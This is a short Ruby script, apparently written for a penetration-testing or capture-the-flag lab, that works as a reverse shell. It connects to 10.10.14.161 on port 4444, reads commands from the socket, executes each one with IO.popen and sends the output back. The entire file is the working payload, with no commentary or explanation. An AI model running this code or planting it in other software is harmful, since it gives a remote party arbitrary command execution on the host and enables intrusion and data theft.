require 'socket'
s = TCPSocket.open('10.10.14.161', 4444)
while (cmd = s.gets)
  IO.popen(cmd, 'r') do |io|
    s.print io.read
  end
end

